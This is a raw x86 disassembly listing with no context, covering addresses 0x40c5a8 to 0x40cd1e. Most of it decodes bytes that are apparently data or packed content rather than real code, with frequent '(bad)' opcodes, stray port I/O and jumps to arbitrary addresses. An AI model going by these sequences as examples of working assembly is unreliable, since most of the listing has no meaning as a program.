  40c5a8:	stos   BYTE PTR es:[edi],al
  40c5a9:	mov    bh,0xa
  40c5ab:	jmp    0x3e2b975d
  40c5b0:	out    dx,al
  40c5b1:	pusha  
  40c5b2:	out    dx,eax
  40c5b3:	jns    0x40c55c
  40c5b5:	fcomip st,st(2)
  40c5b7:	sbb    ah,al
  40c5b9:	jno    0x40c584
  40c5bb:	test   edi,esi
  40c5bd:	jecxz  0x40c62b
  40c5bf:	lock call 0x1d68:0x3fb01cf4
  40c5c7:	in     al,dx
  40c5c8:	div    DWORD PTR [eax+0x23]
  40c5cb:	and    BYTE PTR [ebp+0x73],ch
  40c5ce:	sbb    edx,DWORD PTR [ebx-0x45d37319]
  40c5d4:	les    ebx,FWORD PTR [ebx]
  40c5d6:	add    al,0xbe
  40c5d8:	inc    ecx
  40c5d9:	xchg   ebx,eax
  40c5da:	push   esp
  40c5db:	push   ebx
  40c5dc:	push   ecx
  40c5dd:	mov    BYTE PTR [esi],bh
  40c5df:	inc    esi
  40c5e0:	outs   dx,DWORD PTR ds:[esi]
  40c5e1:	sbb    al,0x77
  40c5e3:	xor    BYTE PTR [ebp+eiz*2+0x4d],0x2
  40c5e8:	ucomiss xmm4,DWORD PTR [ebp+0x5ec58794]
  40c5ef:	fst    QWORD PTR [ebp-0x2239c7a1]
  40c5f5:	and    cl,bh
  40c5f7:	cmp    ecx,ebp
  40c5f9:	mov    edx,0x97ca0a6c
  40c5fe:	push   ebp
  40c5ff:	aam    0xb
  40c601:	retf   0x19bb
  40c604:	cmp    BYTE PTR [ebx],dh
  40c606:	dec    esi
  40c607:	inc    ebp
  40c608:	jecxz  0x40c67e
  40c60a:	(bad)
  40c60d:	mov    dh,0xbe
  40c60f:	icebp  
  40c610:	faddp  st(7),st
  40c612:	push   ecx
  40c613:	shr    DWORD PTR [edx-0x2472d6cd],cl
  40c619:	(bad)  
  40c61a:	push   ss
  40c61b:	jne    0x40c611
  40c61d:	and    DWORD PTR [ebp-0x1cd263f2],esp
  40c623:	ja     0x40c68c
  40c625:	pop    ds
  40c626:	cmp    al,0xb5
  40c628:	retf   
  40c629:	mov    ds,WORD PTR [edi-0x6a]
  40c62c:	cmc    
  40c62d:	sbb    BYTE PTR [ecx],cl
  40c62f:	dec    esp
  40c630:	(bad)  
  40c631:	or     eax,0xe71ece5f
  40c636:	or     al,0x40
  40c638:	sahf   
  40c639:	(bad)  
  40c63b:	mov    cl,0x85
  40c63d:	iret   
  40c63e:	dec    ecx
  40c63f:	add    eax,0x9c0ab805
  40c644:	outs   dx,BYTE PTR ds:[esi]
  40c645:	pop    esi
  40c646:	sbb    ebp,DWORD PTR [edx]
  40c648:	dec    ebp
  40c649:	ror    DWORD PTR [ebx+0x5eb83685],0x79
  40c650:	inc    edx
  40c651:	jge    0x40c5db
  40c653:	loop   0x40c621
  40c655:	mov    dl,0xfc
  40c657:	fnstenv [ebx]
  40c659:	lea    esi,[esi]
  40c65b:	popf   
  40c65c:	ret    0x2c4d
  40c65f:	je     0x40c671
  40c661:	add    DWORD PTR [ebx+0xfc6985f],esp
  40c667:	outs   dx,DWORD PTR ds:[esi]
  40c668:	repnz popf 
  40c66a:	push   eax
  40c66b:	daa    
  40c66c:	dec    edx
  40c66d:	stc    
  40c66e:	pop    ecx
  40c66f:	mov    edi,0xb447c3c2
  40c674:	ds das 
  40c676:	fcomp  QWORD PTR [eax+eax*8+0x73]
  40c67a:	xchg   ecx,eax
  40c67b:	daa    
  40c67c:	icebp  
  40c67d:	fstp   QWORD PTR [ebx]
  40c67f:	ja     0x40c628
  40c681:	mov    ds:0x4752803e,al
  40c686:	stos   BYTE PTR es:[edi],al
  40c687:	lds    edi,FWORD PTR [eax+0x27e37ceb]
  40c68d:	add    BYTE PTR [ecx-0x1b],0x8c
  40c691:	pop    ebp
  40c692:	cld    
  40c693:	xor    al,0x4
  40c695:	sub    al,0x11
  40c697:	fadd   QWORD PTR [eax-0x41047f09]
  40c69d:	sub    BYTE PTR [edx],0x53
  40c6a0:	ret    0x2161
  40c6a3:	(bad)  
  40c6a4:	mov    ch,BYTE PTR [edx]
  40c6a6:	call   0x5de137d5
  40c6ab:	test   eax,0xaafc2084
  40c6b0:	imul   edx,DWORD PTR [edx+0x33],0xf21f2d7e
  40c6b7:	xchg   ah,dl
  40c6b9:	(bad)  
  40c6ba:	icebp  
  40c6bb:	dec    ecx
  40c6bc:	ret    0x2398
  40c6bf:	mov    edi,0xc7c48c24
  40c6c4:	mov    edi,0x7bac5c0b
  40c6c9:	xchg   DWORD PTR [ebp+0x1c],ecx
  40c6cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6cd:	add    BYTE PTR [edx],bh
  40c6cf:	repz push esp
  40c6d1:	outs   dx,BYTE PTR ds:[esi]
  40c6d2:	loope  0x40c663
  40c6d4:	stos   DWORD PTR es:[edi],eax
  40c6d5:	push   ds
  40c6d6:	test   DWORD PTR [edx],0x2198c6c
  40c6dc:	add    esp,esi
  40c6de:	int    0xd
  40c6e0:	loope  0x40c6bd
  40c6e2:	stos   DWORD PTR es:[edi],eax
  40c6e3:	int3   
  40c6e4:	test   al,0xc6
  40c6e6:	mov    bl,0x64
  40c6e8:	adc    al,0xdc
  40c6ea:	popa   
  40c6eb:	push   ebx
  40c6ec:	mov    ah,0x38
  40c6ee:	and    ebx,DWORD PTR [edi+0x35]
  40c6f1:	(bad)  
  40c6f2:	in     al,0xb
  40c6f4:	call   0x3955:0x68e05734
  40c6fb:	or     al,0x53
  40c6fd:	mov    edi,esi
  40c6ff:	adc    BYTE PTR [edi],dl
  40c701:	push   esp
  40c702:	nop
  40c703:	inc    ebx
  40c704:	cs jno 0x40c732
  40c707:	pop    esi
  40c708:	dec    ecx
  40c709:	and    eax,0xf9abd75b
  40c70e:	mov    ss,WORD PTR [eax+0x17c72ba7]
  40c714:	jmp    0x40c6a0
  40c716:	adc    dh,al
  40c718:	inc    esp
  40c719:	clc    
  40c71a:	inc    ebp
  40c71b:	lods   eax,DWORD PTR ds:[esi]
  40c71c:	pop    ds
  40c71d:	dec    eax
  40c71e:	pusha  
  40c71f:	jmp    DWORD PTR [esi-0x5e5c44f1]
  40c725:	pop    esi
  40c726:	push   edx
  40c727:	retf   0xa802
  40c72a:	popa   
  40c72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c72c:	inc    esp
  40c72d:	sahf   
  40c72e:	lods   eax,DWORD PTR ds:[esi]
  40c72f:	sub    ebp,DWORD PTR [edi]
  40c731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c732:	lock retf 0xfba4
  40c736:	fcmove st,st(4)
  40c738:	les    edx,FWORD PTR [eax-0x2d]
  40c73b:	(bad)  
  40c73c:	push   ecx
  40c73d:	dec    ebp
  40c73e:	shr    BYTE PTR [esp+ebp*4-0x9],0x5b
  40c743:	fadd   QWORD PTR [eax+0x2e1591f0]
  40c749:	and    DWORD PTR [ecx+0x50],ebp
  40c74c:	(bad)  [eax+0x50]
  40c74f:	popa   
  40c750:	(bad)  
  40c751:	push   eax
  40c752:	jo     0x40c71c
  40c754:	push   esi
  40c755:	and    al,0xc9
  40c757:	cmp    BYTE PTR [esi],dh
  40c759:	and    bl,BYTE PTR [eax-0x67]
  40c75c:	sub    dh,ah
  40c75e:	jo     0x40c713
  40c760:	inc    esi
  40c761:	loopne 0x40c734
  40c763:	imul   ebp,esp,0xffffffe4
  40c766:	test   DWORD PTR [edx-0x310dad8e],0xc9d81cfa
  40c770:	jno    0x40c717
  40c772:	rcl    BYTE PTR [eax],1
  40c774:	jnp    0x40c74d
  40c776:	(bad)  
  40c777:	enter  0x22cb,0x5f
  40c77b:	push   DWORD PTR [edx+eiz*1]
  40c77e:	jno    0x40c7d1
  40c780:	stc    
  40c781:	pop    ds
  40c782:	mov    bl,BYTE PTR [ecx+0x1eab1ab3]
  40c788:	mov    ebp,0x2460db2d
  40c78d:	sbb    eax,0x75ebf1f8
  40c792:	cdq    
  40c793:	inc    ebx
  40c794:	dec    edi
  40c795:	adc    BYTE PTR [eax+0x60],dh
  40c798:	add    edx,esi
  40c79a:	push   ds
  40c79b:	shl    DWORD PTR [edx],1
  40c79d:	xchg   esi,eax
  40c79e:	mov    edi,edx
  40c7a0:	not    bl
  40c7a2:	ror    ch,1
  40c7a4:	jnp    0x40c774
  40c7a6:	sub    ebp,DWORD PTR ds:0x46d623ac
  40c7ac:	dec    edi
  40c7ad:	pop    esp
  40c7ae:	shl    BYTE PTR [eax+ecx*1],1
  40c7b1:	bound  edi,QWORD PTR [edi-0x48]
  40c7b4:	sub    bl,dh
  40c7b6:	push   0x41
  40c7b8:	adc    cl,ah
  40c7ba:	jnp    0x40c7dd
  40c7bc:	push   0x52
  40c7be:	or     eax,0x7a0a6c10
  40c7c3:	adc    al,0xf4
  40c7c5:	pop    es
  40c7c6:	adc    eax,0x1e6d0597
  40c7cb:	xchg   edi,eax
  40c7cc:	shr    DWORD PTR [esi-0x617e3f0b],cl
  40c7d2:	xchg   ecx,eax
  40c7d3:	add    DWORD PTR [edx+eax*2-0x1aa7a0a],ebp
  40c7da:	adc    DWORD PTR [ebp-0x32],esi
  40c7dd:	mov    bl,0xd2
  40c7df:	jle    0x40c76f
  40c7e1:	bound  eax,QWORD PTR [esp+eax*8+0x4a]
  40c7e5:	shl    DWORD PTR [esp+esi*2],0x5d
  40c7e9:	fs out 0xe8,eax
  40c7ec:	xor    bh,BYTE PTR [ebx]
  40c7ee:	sub    BYTE PTR [edx],0xb5
  40c7f1:	not    DWORD PTR [edi+0xf]
  40c7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f5:	xor    bl,BYTE PTR [edi+0x321fc04d]
  40c7fb:	or     BYTE PTR [ecx+0x5e],cl
  40c7fe:	add    DWORD PTR [edx+0x36],0x7f
  40c802:	jge    0x40c830
  40c804:	lods   ax,WORD PTR ds:[esi]
  40c806:	pop    es
  40c807:	mov    al,0x9
  40c809:	mov    ecx,0x36e00b26
  40c80e:	cmp    eax,0xf4f13b42
  40c813:	into   
  40c814:	or     ecx,DWORD PTR [eax+esi*8]
  40c817:	inc    esi
  40c818:	dec    edi
  40c819:	xor    BYTE PTR ds:0x2114d2dc,ch
  40c81f:	and    ebp,ebp
  40c821:	inc    edx
  40c822:	scas   eax,DWORD PTR es:[edi]
  40c823:	add    BYTE PTR [esi-0x1e],al
  40c826:	jle    0x40c812
  40c828:	imul   eax,DWORD PTR [esi+0x50],0xbdf99e02
  40c82f:	js     0x40c7b1
  40c831:	ret    
  40c832:	mov    dh,0x3d
  40c834:	repnz popa 
  40c836:	pop    DWORD PTR [edx+0x8]
  40c839:	or     DWORD PTR [ecx+0x2003b8c6],esi
  40c83f:	dec    ebx
  40c840:	(bad)  
  40c841:	mov    ebx,0xbe1ce65e
  40c846:	lock xor BYTE PTR [edi-0x1b36e075],bl
  40c84d:	sbb    ebp,esp
  40c84f:	jo     0x40c8d0
  40c851:	mov    ds:0x5de38632,al
  40c856:	(bad)  
  40c857:	dec    ebp
  40c858:	sbb    eax,0x81850c4c
  40c85d:	jne    0x40c898
  40c85f:	sbb    ebx,edx
  40c861:	mov    edx,0x26f35418
  40c866:	pop    esp
  40c867:	test   bh,bh
  40c869:	mov    dl,0xd8
  40c86b:	sbb    BYTE PTR [edx+0x7be045c7],bl
  40c871:	sub    al,BYTE PTR [eax]
  40c873:	add    bh,al
  40c875:	inc    ebp
  40c876:	in     al,0x8f
  40c878:	jno    0x40c87a
  40c87a:	add    BYTE PTR [ebx+0x6e9e045],cl
  40c880:	add    al,0x0
  40c882:	add    bh,bh
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0xd3b1e3ac
  40c891:	ror    edi,0xe9
  40c894:	xlat   BYTE PTR ds:[ebx]
  40c895:	mov    esi,0xbec492be
  40c89a:	mov    esi,0xc3d62245
  40c89f:	sbb    BYTE PTR [eax-0x3c],ah
  40c8a2:	jmp    0x21d4776c
  40c8a7:	sub    BYTE PTR [ebp-0x70],ch
  40c8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8ab:	xchg   ebp,eax
  40c8ac:	test   eax,0xe7aed2f9
  40c8b1:	clc    
  40c8b2:	lock push cs
  40c8b4:	rol    BYTE PTR [ebp-0x6f],0x65
  40c8b8:	push   cs
  40c8b9:	push   edx
  40c8ba:	pop    eax
  40c8bb:	lods   eax,DWORD PTR ds:[esi]
  40c8bc:	and    BYTE PTR [edi],dh
  40c8be:	sbb    ah,cl
  40c8c0:	(bad)  
  40c8c1:	push   esi
  40c8c2:	push   es
  40c8c3:	faddp  st(6),st
  40c8c5:	add    ecx,DWORD PTR [edx-0x51]
  40c8c8:	mov    ecx,0x2f3cd4d0
  40c8cd:	adc    BYTE PTR ds:0x83b380f8,0x58
  40c8d4:	mov    ecx,0x17a928ea
  40c8d9:	jg     0x40c85f
  40c8db:	std    
  40c8dc:	addr16 (bad) 
  40c8de:	mov    ds:0xfbeab2d2,eax
  40c8e3:	outs   dx,DWORD PTR ds:[esi]
  40c8e4:	push   eax
  40c8e5:	adc    DWORD PTR [ebx+0x5b],ebp
  40c8e8:	std    
  40c8e9:	pop    es
  40c8ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8eb:	dec    ebx
  40c8ec:	dec    esp
  40c8ed:	mov    al,0xd9
  40c8ef:	arpl   di,cx
  40c8f1:	in     al,0x69
  40c8f3:	(bad)  
  40c8f4:	jno    0x40c8de
  40c8f6:	jmp    0x40c91c
  40c8f8:	pusha  
  40c8f9:	sbb    DWORD PTR [esi+0x7c],esp
  40c8fc:	nop
  40c8fd:	or     ah,BYTE PTR ds:0x31294055
  40c903:	and    al,0x6a
  40c905:	ins    DWORD PTR es:[edi],dx
  40c906:	pop    esp
  40c907:	mov    esi,0x5cf6146b
  40c90c:	jne    0x40c911
  40c90e:	jp     0x40c8d4
  40c910:	add    ebp,DWORD PTR ds:0x9495a777
  40c916:	inc    ebp
  40c917:	outs   dx,BYTE PTR ds:[esi]
  40c918:	in     al,0x63
  40c91a:	enter  0x139f,0xa4
  40c91e:	xchg   esi,eax
  40c91f:	add    al,0x32
  40c921:	in     al,0xe4
  40c923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c924:	aam    0x21
  40c926:	ds sub al,0x3b
  40c929:	jne    0x40c903
  40c92b:	add    ah,BYTE PTR [ecx]
  40c92d:	jmp    0x40c936
  40c92f:	ret    0xb9ba
  40c932:	mov    ecx,0xaeecaa03
  40c937:	mov    dl,0xfb
  40c939:	jecxz  0x40c9a0
  40c93b:	sti    
  40c93c:	sar    DWORD PTR [esi],1
  40c93e:	mov    edx,ecx
  40c940:	add    edi,esp
  40c942:	(bad)  
  40c943:	(bad)  
  40c944:	je     0x40c8ea
  40c946:	jge    0x40c98f
  40c948:	(bad)  
  40c949:	std    
  40c94a:	jnp    0x40c975
  40c94c:	xchg   ecx,eax
  40c94d:	adc    dl,BYTE PTR [ebx-0x1c05e9b6]
  40c953:	cs in  al,dx
  40c955:	out    0x5c,eax
  40c957:	dec    eax
  40c958:	mov    bl,0x6d
  40c95a:	fst    QWORD PTR [esi+0x6b]
  40c95d:	push   edi
  40c95e:	dec    esi
  40c95f:	into   
  40c960:	popf   
  40c961:	pop    ebx
  40c962:	xor    esi,edi
  40c964:	jl     0x40c9ac
  40c966:	mov    al,ah
  40c968:	mul    DWORD PTR [ecx+0x48]
  40c96b:	add    ecx,DWORD PTR [ebp+0x5c]
  40c96e:	inc    edi
  40c96f:	mov    ss,WORD PTR [eax+0x76d51cc8]
  40c975:	or     eax,0xf2f9a4af
  40c97a:	jae    0x40c9ef
  40c97c:	(bad)  
  40c97d:	outs   dx,BYTE PTR ds:[esi]
  40c97e:	mov    ds:0x3a536a91,al
  40c983:	out    dx,eax
  40c984:	mov    ebp,0x55ce50d0
  40c989:	test   DWORD PTR [esp+esi*8+0x63],0xb2a50bb
  40c991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c992:	mov    cl,0x87
  40c994:	fadd   DWORD PTR [ebp+0x7d]
  40c997:	mov    al,ds:0xf22fc137
  40c99c:	test   al,0xb8
  40c99e:	add    eax,0x85c1cc71
  40c9a3:	pop    es
  40c9a4:	mov    ch,0x46
  40c9a6:	sti    
  40c9a7:	adc    al,0x6d
  40c9a9:	push   ebp
  40c9aa:	fsub   DWORD PTR [eax]
  40c9ac:	fisubr WORD PTR [edi-0x7d899fd0]
  40c9b2:	and    bl,ah
  40c9b4:	or     ch,ch
  40c9b6:	sbb    bh,bl
  40c9b8:	mov    ecx,0x8cf75783
  40c9bd:	call   0x1e658387
  40c9c2:	or     eax,0x801e5b0
  40c9c7:	call   0xd8895b25
  40c9cc:	gs daa 
  40c9ce:	push   ecx
  40c9cf:	out    dx,eax
  40c9d0:	js     0x40c9d1
  40c9d2:	pop    ecx
  40c9d3:	stc    
  40c9d4:	dec    ebp
  40c9d5:	push   ebx
  40c9d6:	inc    ecx
  40c9d7:	leave  
  40c9d8:	or     ch,BYTE PTR [ebx-0x2c2e8b91]
  40c9de:	or     eax,0x39f72b9b
  40c9e3:	call   0x39c2:0x91318eac
  40c9ea:	call   ebp
  40c9ec:	mov    BYTE PTR [eax],dl
  40c9ee:	lahf   
  40c9ef:	cmp    al,0x1d
  40c9f1:	mov    DWORD PTR [ecx],esp
  40c9f3:	das    
  40c9f4:	leave  
  40c9f5:	mov    ebp,0xd4e11322
  40c9fa:	xchg   ecx,eax
  40c9fb:	push   cs
  40c9fc:	push   cs
  40c9fd:	jmp    0x40ca11
  40c9ff:	out    0x61,eax
  40ca01:	call   0x2037:0x42e23f35
  40ca08:	and    DWORD PTR [edx-0x5fc67182],ebp
  40ca0e:	mov    bl,0xf6
  40ca10:	fst    QWORD PTR [eax+0x53]
  40ca13:	and    DWORD PTR [eax+ebp*8],ecx
  40ca16:	ja     0x40ca36
  40ca18:	enter  0x83ca,0xf2
  40ca1c:	mul    DWORD PTR [esp+esi*1+0xa]
  40ca20:	inc    ebp
  40ca21:	sbb    eax,DWORD PTR [edx+0x59]
  40ca24:	retf   0x8545
  40ca27:	push   esi
  40ca28:	test   eax,0xc5ab3af3
  40ca2d:	jb     0x40c9d5
  40ca2f:	or     BYTE PTR [ecx-0x5e3766f6],al
  40ca35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca36:	cwde   
  40ca37:	jp     0x40ca0d
  40ca39:	inc    edx
  40ca3a:	push   eax
  40ca3b:	xor    eax,0x4b167b16
  40ca40:	xchg   esi,eax
  40ca41:	neg    DWORD PTR [ebx+0x3d7d7ccd]
  40ca47:	jmp    0x40c9dc
  40ca49:	xchg   ecx,eax
  40ca4a:	pusha  
  40ca4b:	jo     0x40ca46
  40ca4d:	sub    DWORD PTR [esp+eiz*2],esi
  40ca50:	push   es
  40ca51:	cmp    ch,BYTE PTR [edx+0xc]
  40ca54:	inc    esp
  40ca55:	xchg   edx,eax
  40ca56:	mov    esp,0xd67ae1df
  40ca5b:	pop    ecx
  40ca5c:	jae    0x40cadd
  40ca5e:	out    0x8e,eax
  40ca60:	and    al,0xfe
  40ca62:	pop    ecx
  40ca63:	rol    BYTE PTR [ebp+ebp*1-0x7d],0x17
  40ca68:	rol    DWORD PTR [esp+edx*1+0x64],cl
  40ca6c:	call   0x14ab68fd
  40ca71:	mov    edx,0x7301bdba
  40ca76:	sbb    dh,dh
  40ca78:	add    edx,DWORD PTR [ebx+0x49e40563]
  40ca7e:	jmp    0x40ca29
  40ca80:	loopne 0x40ca07
  40ca82:	stos   DWORD PTR es:[edi],eax
  40ca83:	(bad)  
  40ca85:	(bad)  [edx+0x2c39d40]
  40ca8b:	xor    eax,0xf66d10e7
  40ca90:	(bad)  
  40ca91:	das    
  40ca92:	xor    bh,BYTE PTR [eax-0x8ae6a7a]
  40ca98:	mov    ?,WORD PTR [esi]
  40ca9a:	cmc    
  40ca9b:	gs add esi,edx
  40ca9e:	or     BYTE PTR [edi+0x3be724ec],bh
  40caa4:	daa    
  40caa5:	imul   ebp,ecx,0x44
  40caa8:	lea    edx,[edx+0x6b855c48]
  40caae:	mov    WORD PTR [esi-0x7b],ds
  40cab1:	shl    dh,0xcd
  40cab4:	jne    0x40cb0c
  40cab6:	pop    es
  40cab7:	enter  0x8296,0x5c
  40cabb:	add    cl,BYTE PTR [esi-0x2b]
  40cabe:	shr    DWORD PTR [edi+0x6bfdbcce],0x25
  40cac5:	popf   
  40cac6:	into   
  40cac7:	jbe    0x40cb13
  40cac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caca:	in     al,0xb7
  40cacc:	push   edx
  40cacd:	pop    ds
  40cace:	js     0x40cadb
  40cad0:	bound  ecx,QWORD PTR [ebx]
  40cad2:	inc    edx
  40cad3:	jno    0x40caac
  40cad5:	inc    edx
  40cad6:	in     eax,dx
  40cad7:	scas   eax,DWORD PTR es:[edi]
  40cad8:	mov    ecx,0x36f8a327
  40cadd:	leave  
  40cade:	jo     0x40ca7c
  40cae0:	and    DWORD PTR [ebx-0x6e],ebp
  40cae3:	push   ebp
  40cae4:	pop    eax
  40cae5:	rol    DWORD PTR [ecx-0x473d934a],0x94
  40caec:	icebp  
  40caed:	pop    ss
  40caee:	std    
  40caef:	jle    0x40ca98
  40caf1:	mov    ds:0x1491292,eax
  40caf6:	dec    esi
  40caf7:	(bad)  [edi-0x2f]
  40cafa:	rcr    eax,cl
  40cafc:	cmp    esp,DWORD PTR [esi-0x4d]
  40caff:	push   esi
  40cb00:	cmp    eax,0x3d85ef03
  40cb05:	jne    0x40cabe
  40cb07:	fistp  QWORD PTR [ecx+ecx*1]
  40cb0a:	xor    esp,edi
  40cb0c:	adc    eax,0xb91afabe
  40cb11:	in     eax,dx
  40cb12:	ret    
  40cb13:	inc    BYTE PTR [edi-0x5f]
  40cb16:	aam    0xe8
  40cb18:	and    dh,al
  40cb1a:	mov    dh,0x16
  40cb1c:	mov    esi,0x5af4564d
  40cb21:	mov    eax,0x92bbfa01
  40cb26:	dec    esp
  40cb27:	lods   eax,DWORD PTR ds:[esi]
  40cb28:	sub    DWORD PTR es:[edx],0x251d089c
  40cb2f:	gs mov ch,0xa3
  40cb32:	ror    BYTE PTR [eax],cl
  40cb34:	mov    ah,0xe9
  40cb36:	jp     0x40cb2b
  40cb38:	inc    ebx
  40cb39:	inc    edi
  40cb3a:	pop    esp
  40cb3b:	xchg   esi,eax
  40cb3c:	cmp    DWORD PTR [edx-0x54296947],0x28
  40cb43:	(bad)  
  40cb44:	xor    BYTE PTR [ebp+0x751af035],ah
  40cb4a:	in     al,0xc3
  40cb4c:	arpl   si,bx
  40cb4e:	or     dl,BYTE PTR [ebp+esi*8+0x2b274eac]
  40cb55:	push   ebx
  40cb57:	add    eax,0x3cb94d10
  40cb5c:	mov    ds:0xfa1736e,al
  40cb61:	and    esi,DWORD PTR [ebx+0x65]
  40cb64:	shl    DWORD PTR [edi],cl
  40cb66:	xchg   ebp,eax
  40cb67:	idiv   BYTE PTR [ebx+0x643ce66f]
  40cb6d:	aad    0x62
  40cb6f:	call   0x8e53:0x472c0b77
  40cb76:	and    al,0x74
  40cb78:	xchg   ebx,eax
  40cb79:	sub    BYTE PTR [ebp-0x31b29427],cl
  40cb7f:	add    DWORD PTR ds:0x7b76b05d,esp
  40cb85:	sub    ch,BYTE PTR [edi-0x272bdf46]
  40cb8b:	mov    bl,0xe6
  40cb8d:	popf   
  40cb8e:	add    eax,0x33d3571b
  40cb93:	(bad)  
  40cb94:	out    0x34,al
  40cb96:	add    BYTE PTR [edx-0x57fc4597],dl
  40cb9c:	push   eax
  40cb9d:	push   esp
  40cb9e:	adc    DWORD PTR [eax+0x39d8f435],eax
  40cba4:	sub    ebp,0xffffff8f
  40cba7:	adc    dh,dh
  40cba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbaa:	mov    ecx,0x76605d28
  40cbaf:	jnp    0x40cb38
  40cbb1:	rol    DWORD PTR [ebx+0x587b378e],1
  40cbb7:	ins    DWORD PTR es:[edi],dx
  40cbb8:	mov    ?,WORD PTR [esi+0x10]
  40cbbb:	mov    dh,0xa5
  40cbbd:	inc    eax
  40cbbe:	inc    ebp
  40cbbf:	push   cs
  40cbc0:	add    BYTE PTR [edx],dh
  40cbc2:	push   ecx
  40cbc3:	inc    edx
  40cbc4:	(bad)  
  40cbc5:	std    
  40cbc6:	mov    edi,0xe9674c39
  40cbcb:	mov    bh,0x70
  40cbcd:	inc    esp
  40cbce:	enter  0x496b,0xdd
  40cbd2:	test   BYTE PTR [edx+0x61],dl
  40cbd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd6:	int    0xdb
  40cbd8:	mov    ch,0xf4
  40cbda:	retf   
  40cbdb:	jae    0x40cb7f
  40cbdd:	ss ss leave 
  40cbe0:	add    eax,0x81ba88d8
  40cbe5:	(bad)  
  40cbe6:	pop    ebp
  40cbe7:	addr16 ja 0x40cb81
  40cbea:	icebp  
  40cbeb:	mov    bl,BYTE PTR [edx]
  40cbed:	shr    BYTE PTR [esi],cl
  40cbef:	or     BYTE PTR [eax+0x71f09460],cl
  40cbf5:	cld    
  40cbf6:	jne    0x40cc5e
  40cbf8:	call   0x35fa437a
  40cbfd:	test   al,0x61
  40cbff:	mov    al,ds:0xfccbf12f
  40cc04:	sub    eax,0xa4634b72
  40cc09:	rcl    DWORD PTR [esi-0x3f],0xe0
  40cc0d:	push   ecx
  40cc0e:	scas   al,BYTE PTR es:[edi]
  40cc0f:	jne    0x40cc07
  40cc11:	add    DWORD PTR [edx+ebx*2-0x4f],eax
  40cc15:	pop    edx
  40cc16:	das    
  40cc17:	and    al,0xeb
  40cc19:	arpl   WORD PTR [ebx-0x64],bp
  40cc1c:	jmp    0x3b58:0x1ac344d5
  40cc23:	mov    cl,0xaf
  40cc25:	xor    DWORD PTR [edx+0x30163e6],0xffffffe9
  40cc2c:	mov    ds:0x99fa4daf,eax
  40cc31:	xchg   ebp,eax
  40cc32:	jp     0x40cc67
  40cc34:	mov    al,ds:0xbc224849
  40cc39:	push   ds
  40cc3a:	push   edx
  40cc3b:	test   ebp,0xc808f7cf
  40cc41:	pop    esp
  40cc42:	stos   BYTE PTR es:[di],al
  40cc44:	jno    0x40cc3b
  40cc46:	add    eax,0xff155039
  40cc4b:	cmc    
  40cc4c:	sub    al,dh
  40cc4e:	xor    DWORD PTR [esi+0x1b],ecx
  40cc51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc52:	cs aad 0x81
  40cc55:	mov    al,ds:0x7c0ac9a8
  40cc5a:	cs inc edx
  40cc5c:	test   cl,ah
  40cc5e:	les    esp,FWORD PTR [ecx+0x4fe71458]
  40cc64:	or     dl,ch
  40cc66:	xchg   esi,eax
  40cc67:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40cc69:	xchg   ebx,eax
  40cc6a:	ret    0x208e
  40cc6d:	je     0x40ccd6
  40cc6f:	xchg   BYTE PTR [ebp+0x65],cl
  40cc72:	(bad)  
  40cc73:	cmp    eax,0xfee490dd
  40cc78:	pop    esp
  40cc79:	adc    BYTE PTR [edi],ah
  40cc7b:	jp     0x40cc7b
  40cc7d:	xor    ebx,DWORD PTR [edi]
  40cc7f:	inc    ebx
  40cc80:	(bad)  
  40cc81:	dec    ebp
  40cc82:	lods   al,BYTE PTR ds:[esi]
  40cc83:	xchg   BYTE PTR [ebp-0x54733061],dh
  40cc89:	mov    edx,DWORD PTR [ebp-0x1c]
  40cc8c:	mov    esi,DWORD PTR [ebp-0x28]
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40ccde
  40ccd6:	cld    
  40ccd7:	xor    al,0xdd
  40ccd9:	mov    ebp,0x92bebedf
  40ccde:	les    edi,FWORD PTR [esi-0x717fd242]
  40cce4:	mov    WORD PTR [edi+0x14],fs
  40cce7:	jmp    0x4d82726e
  40ccec:	sti    
  40cced:	mov    al,ds:0x39b2a3b7
  40ccf2:	xor    esp,DWORD PTR [ebx-0xab7d8ef]
  40ccf8:	mov    ds:0x5e413a2f,al
  40ccfd:	mov    ah,0x7
  40ccff:	je     0x40ccc7
  40cd01:	jno    0x40ccdd
  40cd03:	and    DWORD PTR [ecx],0x690b31ee
  40cd09:	pop    edx
  40cd0a:	cmp    bh,bl
  40cd0c:	and    al,0xdf
  40cd0e:	jp     0x40cd40
  40cd10:	ret    0x6f8b
  40cd13:	lock add BYTE PTR [ecx-0x281da0e7],ch
  40cd1a:	scas   eax,DWORD PTR es:[edi]
  40cd1b:	out    0xcc,al
  40cd1d:	dec    esi
  40cd1e:	push   eax
